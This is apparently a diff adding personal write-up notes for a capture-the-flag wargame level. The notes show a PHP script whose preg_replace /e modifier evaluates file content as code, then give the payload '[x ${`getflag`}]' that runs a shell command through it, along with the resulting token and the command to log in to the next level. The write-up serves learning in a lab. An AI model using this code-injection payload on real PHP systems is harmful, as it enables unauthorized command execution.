@@ -1,0 +1,54 @@
+$> ls -la
+we have:
+	an executable level06,
+	a level06.php file
+
+
+$> cat level06.php
+preg_replace -> Perform a regular expression search and replace
+preg_replace(pattern_to_search, replacement, subject_to_search_in)
+
+
+/ : denotes boundaries
+#!/usr/bin/php$
+<?php$
+function y($m) {
+	// replace '.' by " x " in m
+	$m = preg_replace("/\./", " x ", $m);
+	
+	// replace @ by " y" in m
+	$m = preg_replace("/@/", " y", $m);
+	return $m;
+}$
+
+function x($y, $z) {
+	//get content of y, so string $m
+	$a = file_get_contents($y);
+	
+	//replace [x(.*)]/e by y("\2")
+	// \2 : matches the content of the 2nd set of parentheses in the expression (back reference)
+	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+	// .* : 0 or more characters of whatever is before *
+	// /e : deprecated regex modifier due to security reasons, which allows PHP code to be used/executed.
+
+	$a = preg_replace("/\[/", "(", $a);
+	$a = preg_replace("/\]/", ")", $a);
+	return $a;
+}$
+$r = x($argv[1], $argv[2]);
+print $r;$
+?>$
+
+
+-> we can try to put a "getflag" in the regex
+` is an execution operator
+$> echo '[x `getflag`]' > /tmp/flag
+we get `getflag`...
+
+Need to find a way to get it considered as a command
+$> echo '[x ${`getflag`}]' > /tmp/flag
+$> ./level06 /tmp/flag
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+
+--> su level07
